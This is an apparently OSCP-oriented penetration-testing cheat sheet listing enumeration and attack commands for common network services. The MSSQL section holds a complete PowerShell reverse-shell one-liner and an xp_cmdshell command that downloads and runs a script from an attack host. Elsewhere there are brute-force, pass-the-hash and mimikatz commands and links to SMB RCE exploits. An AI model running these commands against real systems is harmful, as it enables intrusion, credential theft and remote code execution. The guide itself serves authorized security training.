# Enumeration Quick Reference   
## Contents 
- [Enumeration Quick Reference](#enumeration-quick-reference)
  * [Contents](#contents)
  * [Checklist](#checklist)
    + [Masscan](#masscan)
    + [Network Enum:](#network-enum-)
    + [Traceroute and Ping](#traceroute-and-ping)
    + [NetDiscover (ARP Scanning):](#netdiscover--arp-scanning--)
  * [Host enum](#host-enum)
  * [Service Enum](#service-enum)
    + [TCP Port 21: FTP](#tcp-port-21--ftp)
    + [TCP Port 25: SMTP (Webmail)](#tcp-port-25--smtp--webmail-)
    + [TCP Port 53: DNS](#tcp-port-53--dns)
    + [TCP Port 88: Kerberos](#tcp-port-88--kerberos)
    + [TCP Port 139: NetBIOS](#tcp-port-139--netbios)
    + [TCP Port 389: LDAP](#tcp-port-389--ldap)
    + [TCP Port 445: SMB](#tcp-port-445--smb)
    + [TCP Port 1433: MSSQL](#tcp-port-1433--mssql)
    + [TCP Port 2049: NFS](#tcp-port-2049--nfs)
    + [TCP Port 3306: MySQL](#tcp-port-3306--mysql)
    + [UDP Port 161, 162: SNMP](#udp-port-161--162--snmp)
  * [Resources](#resources)  
  

## Checklist   
- [ ] Recon (OSINT)
- [ ] (If given a range): what hosts are on the network
- [ ] Open well known ports (0-1023)
- [ ] What are these ports used for (banner grab if needed) 
- [ ] Open high ports (1024-65535) 
- [ ] Operating system 
- [ ] Identify open services 
- [ ] FTP or SMB anon log in 
- [ ] Identify versions of services, look for vulns / exploits (searchsploit, github, google) 
- [ ] HTTP / HTPPS services -> Web enum (see Web folder), look for web vulns on pages 
- [ ] Brute force any services log ons / log in pages   

[Enumeration Mind Map](https://github.com/theonlykernel/enumeration/wiki)     
  
### Masscan   
Nmap is not ideal for lots of IPs. Masscan: seperates SYN send from ACK receive code, ids open/closed from response, less function but faster. Can be hard to get accurate results.     
  
    masscan 192.168.1.1/24 -p 22,25,80,443,3389            
    --rate 50000   #fastest scan
 Get TLS cert info to identify a domain:   
 
    openssl s_client -connect 10.10.10.10:443 2>/dev/null | openssl x509 -text | grep Subject:    
 Screenshot web pages:   
 
    python3 /opt/eyewitness/EyeWitness.py --web -f sitelist.txt --prepend-https    
### Network Enum:  
    for x in {1..254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "     
    nc -v -w3 -z 192.168.1.10 80    #netcat port scan
    sudo nmap -sn 192.168.1.1-254     #-sn host discovery only, best w/ root privs, --reason to see why hosts is up   
    nmap -v -s 192.168.0.0/24   
    nmap -Pn -vv -F -sSU -T4 -oG /kali/192.168.15.200-254.xml 192.168.15.200-254 | grep -v 'filtered|closed' > /kali/quick_recon.txt 
    smbeagle -c out.csv -n 10.10.10.0/24 -u user -p password   #look for SMB shares     
### Traceroute and Ping   
Identify router and sat hops. Typical TTLs / hop limits: 64 (Linux), 128 (Windows), 255 (networking devices).   

     ping -c3 10.10.10.10    #Linux will run ping process indefinetly   
     tracert 10.10.10.10  
### NetDiscover (ARP Scanning):

    netdiscover -i eth0
    netdiscover -r 172.21.10.0/24

## Host enum 
**Identify os, services/ports/versions. Save results to text files. **      
[Fscan](https://github.com/shadow1ng/fscan/blob/main/README_EN.md)    
[Autorecon](https://github.com/Tib3rius/AutoRecon)             

    ./fscan -h 10.10.10.10     #scan a host or network   
    autorecon 127.0.0.1 --only-scans-dir -v    
    sudo $(which autorecon) 10.10.10.10          #run autorecon with UDP scanning    

    nmap -A -sV -T 4 -vv 127.0.0.1    
    nmap -sV -sT -p- --min-rate 200 -vv 127.0.0.1     
    
    OSCP common scan types: -A, -sU, -sS, sV, -sC, -O
    debug: -vv, -d, --reason

    nc -nvzw1 192.168.53.120 1-65535 2>&1 | grep open     
    
    Run autorecon then open results folder in atom.    

Nmap scan types: 

    -T0 or T1 (evade IDS or firewall detection)  
    -sN (TCP NULL scan - no response if open or blocked by firewall, stealthiest)  
    -sS (SYN scan, default if running as root, not logged by most targets)   
    -sT (TCP 3 way handshake, default if nmap is running without root privileges)   
    -sF (TCP FIN scan - no response if open or blocked by firewall)
    -sX (TCP XMAS scan - FINE/PSH/URG - no response if open or blocked by firewall)
    -sP, -Pn (ping sweeps) 
    -sU (UDP scan) 
    
    -sA (TCP ACK scan - see what ports are not filtered by a firewall)        
    -sW (TCP Window / ACK scan - what ports are not filtered 
    --scanflags (custom scan)
  
    -S <spoof ip>, --spoof-mac <spoof MAC>
    -D <decoy ip>, <own ip> 
    -sI <Zombie ip>  
    --traceroute 
    -f   fragment packets
    -6 (IPv6 scan) 

## Service Enum    
nmap scripts: /usr/share/nmap/scripts, -sC. Use with -sV for best results.         

    nmap --script <name>    --script-help 
    -sV --version-intensity
    
script categories: 

    auth        Authentication related 
    broadcast   Host Discovery thu broadcast scanning 
    brute       Brute force login
    default     Default scripts, same as -sC 
    discovery   Enum info (ex. database tables and DNS names) 
    dos 	Detects servers vulnerable to Denial of Service (DoS)
    exploit 	Tries to exploit vulnerable services
    external 	Uses third-party service (like Geoplugin and Virustotal) 
    fuzzer 	Fuzzing attacks
    intrusive 	Intrusive scripts (brute-force attacks and exploitation) 
    malware 	Looks for backdoors
    safe 	Won’t crash the target
    version 	Retrieve service versions
    vuln        Checks for vulnerabilities against database 
	
	
### TCP Port 21: FTP         	
[Enumerating ftp](https://book.hacktricks.xyz/pentesting/pentesting-ftp)   
Can I ...
- [ ] Anonymously log in or use known creds?  
- [ ] See hidden files? 
- [ ] Download important files (ie. backup files, ssh priv keys, etc)?
- [ ] Upload a webshell?   
- [ ] Find FTP exploits on searchsploit / Google? 
- [ ] Crack creds with hydra? 
- [ ] FTP bounce attack?
[FTP Bounce Attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp/ftp-bounce-attack)     
Logging In 	
	
	anon log in: ftp / no password	or 	Anonymous: asdfasdf           
	nmap -sV -Pn -vv -p 21 --script=ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221     
    hydra -C ftp/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u 127.0.0.1 ftp    
Helpful FTP Commands    

    list -r     #list folder contents recursively (if allowed)
Downloading files    

    wget -m ftp://anonymous:anonymous@10.10.10.10     #downloading all files 
    wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10       #downloading all files without passive mode   

### TCP Port 25: SMTP (Webmail)  
Identify Mail Server version and search for exploits on searchsploit / Google. 
Enumerate usernames. 
Attempt brute forcing of usernames, then passwords.   
[SMTP User Enumeration](https://pentestlab.blog/2012/11/20/smtp-user-enumeration/)       

	smtp-user-enum -M VRF -u <user.txt> -t 127.0.0.1   
	nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 127.0.0.1    
	VRFY root     #manually verify username, after connecting over telnet   
	swaks --to root --from hacker --header "Subject: Test" --body "msg" --server 10.10.10.10     #send mail using swaks   

### TCP Port 53: DNS    
[DNS Hacking (Beginner to Advanced)](http://resources.infosecinstitute.com/dns-hacking/)    
[DNS Enum](https://resources.infosecinstitute.com/topic/dns-enumeration-techniques-in-linux/#gref)      
DNS is commonly open on Windows domain controllers, not usually other devices.    
Reverse (PTR) lookup to resolve an IP to a domain name: 

    dig +noall +answer @10.10.10.10 -x 10.10.10.10     
Zone Transfer:   
    dig -t axfr #zone transfer     
    dig +noall +answer @10.10.10.10 axfr domain.com       
    
Brute force for subdomains:    
    wfuzz -u http://10.10.10.10 -H "Host: FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt      

### TCP Port 88: Kerberos
see active directory cheatsheet

### TCP Port 139: NetBIOS
Usually SMB will be open as well. 
Scan network for NetBIOS name info: 

    sudo nbtscan -v -s : 192.168.1.0/24
	
### TCP Port 389: LDAP 
see Active Directory Cheat Sheet 
	
### TCP Port 445: SMB 
[SMB enumeration with Kali Linux – enum4linux, acccheck and smbmap](https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/)  
[Windows Null Session Enumeration](https://www.adampalmer.me/iodigitalsec/2013/08/10/windows-null-session-enumeration/)  
[NetBIOS Enumeration And Null Session](http://nrupentheking.blogspot.com/2011/02/netbios-enumeration-and-null-session.html)  
[NetBIOS and SMB Penetration Testing on Windows](http://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/)  
[Windows Account info via Authenticated SMB](https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/) 
[nbtscan Cheat Sheet](https://highon.coffee/blog/nbtscan-cheat-sheet/)      

Can I...
- [ ] Identify a version
- [ ] Enum with smbmap, enum4linux, nmap, crackmapexec
- [ ] check for anon log in    
- [ ] check for common CVEs or exploits? (See below)        
[Eternal Blue](https://github.com/3ndG4me/AutoBlue-MS17-010) 
[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)    
[enum4linux](https://github.com/0v3rride/Enum4LinuxPy)            
[crackmapexec](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)    
	
    SAMBA 3.x-4.x  #vulnerable to linux/samba/is_known_pipename
    SAMBA 3.5.11   #vulnerable to linux/samba/is_known_pipename
    Windows SMBv1  #vulnerable to MITM, not encrypted. 
    Windows SMBv2  #Adds message intergrity signing. 
    Windows SMBv3  #Supports encryption, resists MITM, message integrity signing.    

Access with smbclient or rpcclient
	
    smbclient -L 10.10.10.10  
    smbclient -U <HOST> -L 10.10.10.10
    smbclient \\\\10.10.10.10\\share  
    smbclient -L //10.10.10.10 -U user -m SMB2   

if getting error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED or box is running SMB1	
	
    smbclient -L 10.10.10.3 --option='client min protocol=NT1'
	
smbmap: 
	
    smbmap -H 127.0.0.1 -d domain -u username -p password   	

enum4linux: 
	
    enum4linux -a 172.21.0.0
	
nmap: 
	
    nmap --script smb-* -p 139,445, 172.21.0.0
    nmap --script smb-enum-* -p 139,445, 172.21.0.0


CrackMapExec: 

    crackmapexec smb 192.168.10.0/24    #SMB recon    
    crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
    crackmapexec 172.21.0.0 -u Administrator -H [hash] --share
    crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz

Impacket SmbClient: 

     /usr/share/doc/python3-impacket/examples/smbclient.py username@172.21.0.0
	
Impacket: 

     python3 samdump.py SMB 172.21.0.0   
SMB Exploits  

     CVE-2022-24500: RCE from Github.       
     CVE-2021-36972: unauth info disclosure.     
     CVE-2020-1206: SMBleed, limited Win10 and Win Server 1903, 1909, and 2004. 
     CVE-2020-0796: SMBGhost / CoronaBlue, widespread use. SMBv3compression exploit on Windows 10 / Server.         
     CVE-2017-0144: Eternal Blue, WannaCry ransomware.    

[Chain SMBLeed and SMBGhost to get RCE](https://pentest-tools.com/blog/smbleedingghost-exploit)    
[SMBBleedingGhost Python Script](https://github.com/jamf/CVE-2020-0796-RCE-POC/tree/master)    

### TCP Port 1433: MSSQL 
[MSSQL Injection Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)    
Scanning: 
    
    nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>      
Metasploit Modules:     

    auxiliary/scanner/mssql/mssql_login   #brute force login      
    auxiliary/admin/mssql/mssql_enum      #enum info   
    exploit/windows/mssql/mssql_payload   #get shell using creds    
To connect:   

    sqsh -S 10.10.10.10 -U user -P password    
    /usr/share/doc/python3-impacket/examples/mssqlclient.py   #use impacket script to connect    
    /usr/share/doc/python3-impacket/examples/mssqlclient.py HOST/username:password@10.10.10.10 -windows-auth  #log onto a Windows box  
    
Running shell commands using xp_cmdshell (reference article [here](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)):      
Needs to be enabled and executable for your to use it.    

    enable_xp_cmdshell  #enable if using mssqlclient.py    
    SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';  #check if enabled    
    sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;    #configure and enable xp_cmdshell      
    xp_cmdshell 'whoami';    
    
Get a reverse shell using xp_cmdshell (host rev.ps1 file on attack box webserver):    

    $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()       

    EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'   #exec PowerShell script   

### TCP Port 2049: NFS	
[Pentesting NFS](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)  
[No root squash](http://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)     
nmap scripts     

    nfs-ls #List NFS exports and check permissions      
    nfs-showmount #Like showmount -e    
    nfs-statfs #disk statistics and info   
    showmount -e 127.0.0.1
    mkdir /mnt/share   
    sudo mount -t nfs -o v2 127.0.0.1/share /mnt/share -o nolock 
	
### TCP Port 3306: MySQL
Attempt to brute force login.   
Look for http or https sites - might be SQLi vulnerability.  
	
	mysql -h 10.10.10.10 -u root -p    
	nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>   
	

Once connected to a SQL server through a CLI:    

       show databases;    
       use db_name;    
       show tables;    
       show columns from table_name;    
       select * from table_name;    
	
	
### UDP Port 161, 162: SNMP 
[SNMP enumeration with snmpenum and snmpwalk](http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html)          
Simple Network Management Protocol: used to monitor different devices in a network.   	  
MIB: Management Information Base. Stores device information. Object Identifier: idenitifes a specific object (or category) of data in a MIB.     
OID info can be found here: http://oid-info.com/index.htm       
SNMP versions:   
SNMPv1 /2 / 2c:  the authentication is based on a string (community string), data travels in plain-text.    
SNMPv3: uses username / password and community string. Data is encrypted.    
Public (RO) and private (RW) are default community strings. If you know a valid community string you can use snmpwalk or snmp-check to access the MIB and query an OID. Community strings are RO (read only) or RW (Read write). Actions that can be taken depend on the type of string.       
SNMP has data on: network interfaces (ipv4 and ipv6 adresses), usernames, uptime, server / OS version, processes running.    

SNMP Walk: 

    snmpwalk -c public -v1 ipaddress 1
    snmpwalk -c private -v1 ipaddress 1
    snmpwalk -c manager -v1 ipaddress 1

Nmap: 

    nmap 172.21.0.0 -Pn -sU -p 161 --script=

	/usr/share/nmap/scripts/snmp-brute.nse
	/usr/share/nmap/scripts/snmp-hh3c-logins.nse
	/usr/share/nmap/scripts/snmp-info.nse
	/usr/share/nmap/scripts/snmp-interfaces.nse
	/usr/share/nmap/scripts/snmp-ios-config.nse
	/usr/share/nmap/scripts/snmp-netstat.nse
	/usr/share/nmap/scripts/snmp-processes.nse
	/usr/share/nmap/scripts/snmp-sysdescr.nse
	/usr/share/nmap/scripts/snmp-win32-services.nse
	/usr/share/nmap/scripts/snmp-win32-shares.nse
	/usr/share/nmap/scripts/snmp-win32-software.nse
	/usr/share/nmap/scripts/snmp-win32-users.nse

Metasploit aux modules: 

 	auxiliary/scanner/misc/oki_scanner                                    
 	auxiliary/scanner/snmp/aix_version                                   
 	auxiliary/scanner/snmp/arris_dg950                                   
 	auxiliary/scanner/snmp/brocade_enumhash                               
 	auxiliary/scanner/snmp/cisco_config_tftp   #RW  community string, default is private                                
 	auxiliary/scanner/snmp/cisco_upload_file                              
 	auxiliary/scanner/snmp/cnpilot_r_snmp_loot                             
 	auxiliary/scanner/snmp/epmp1000_snmp_loot                             
 	auxiliary/scanner/snmp/netopia_enum                                    
 	auxiliary/scanner/snmp/sbg6580_enum                                 
 	auxiliary/scanner/snmp/snmp_enum    #need RO or RW communit string, public or private                                     
 	auxiliary/scanner/snmp/snmp_enum_hp_laserjet                           
 	auxiliary/scanner/snmp/snmp_enumshares                                
 	auxiliary/scanner/snmp/snmp_enumusers                                 
 	auxiliary/scanner/snmp/snmp_login                                     


Onesixtyone: brute force community strings     

	onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 172.21.0.X
Snmp-check

	snmp-check 172.21.0.0 -c public
Impacket: 

	python3 samdump.py SNMP 172.21.0.0
	
	
## Resources  
http://www.0daysecurity.com/penetration-testing/enumeration.html     
Backup Link: https://web.archive.org/web/20201122081447/http://www.0daysecurity.com/penetration-testing/enumeration.html  
